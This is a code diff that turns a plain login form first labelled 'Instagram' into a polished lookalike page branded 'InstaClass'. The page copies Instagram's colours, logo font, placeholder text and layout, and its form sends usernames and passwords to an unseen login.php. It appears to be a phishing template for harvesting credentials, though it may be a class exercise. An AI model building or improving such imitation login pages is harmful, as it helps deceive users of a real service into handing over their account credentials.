@@ -1,1 +1,106 @@
-<html><body><form method='POST' action='login.php'>Instagram<br><input name='username'><input name='password' type='password'><input type='submit'></form></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>InstaClass Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #fafafa;
+      display: flex;
+      height: 100vh;
+    }
+
+    .left-panel {
+      flex: 1;
+      background: linear-gradient(to bottom right, #f58529, #dd2a7b, #8134af, #515bd4);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+    }
+
+    .left-panel img {
+      width: 80%;
+      border-radius: 20px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+    }
+
+    .right-panel {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-box {
+      background: white;
+      padding: 40px;
+      border: 1px solid #ddd;
+      text-align: center;
+      border-radius: 8px;
+    }
+
+    .logo {
+      font-family: 'Grand Hotel', cursive;
+      font-size: 48px;
+      color: #262626;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #3897f0;
+      border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    a {
+      color: #00376b;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="left-panel">
+    <img src="https://images.unsplash.com/photo-1607746882042-944635dfe10e?fit=crop&w=600&q=80" alt="Smiling People"/>
+  </div>
+  <div class="right-panel">
+    <div class="login-box">
+      <div class="logo">InstaClass</div>
+      <form method="POST" action="login.php">
+        <input type="text" name="username" placeholder="Phone number, username, or email" required />
+        <input type="password" name="password" placeholder="Password" required />
+        <button type="submit">Log in</button>
+      </form>
+      <div class="footer">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
